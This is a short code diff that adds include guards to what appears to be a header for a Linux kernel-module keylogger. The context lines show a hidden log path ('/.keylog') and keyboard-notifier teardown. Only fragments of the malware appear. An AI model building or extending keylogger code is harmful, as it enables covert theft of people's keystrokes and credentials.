@@ -1,3 +1,6 @@
+#ifndef KEYLOGGER_H
+#define KEYLOGGER_H
+
 #define FLUSHSIZE 16
 #define LOGSIZE   128
 #define LOG_FILE "/.keylog"
@@ -227,3 +230,5 @@ void stop_keylogger(void)
         filp_close(logfile, NULL);
     unregister_keyboard_notifier(&nb);
 }
+
+#endif /* KEYLOGGER_H */
